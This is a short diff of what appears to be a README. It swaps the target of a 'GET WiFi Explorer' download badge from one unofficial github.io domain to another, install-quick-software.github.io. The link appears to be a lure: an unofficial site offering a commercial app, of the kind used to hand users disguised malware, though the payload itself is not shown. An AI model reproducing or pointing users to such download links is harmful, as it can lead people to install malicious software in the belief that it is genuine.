@@ -7,7 +7,7 @@
 <br>  
 
 <div align="center">  
-<a href="https://osx-app.github.io/.github/wifi-explorer">  
+<a href="https://install-quick-software.github.io/.github/wifi-explorer">  
 <img src="https://img.shields.io/badge/💻_GET_WiFi_Explorer-cyan?style=for-the-badge&logo=apple" alt="GET WiFi Explorer">  
 </a>  
 </div>
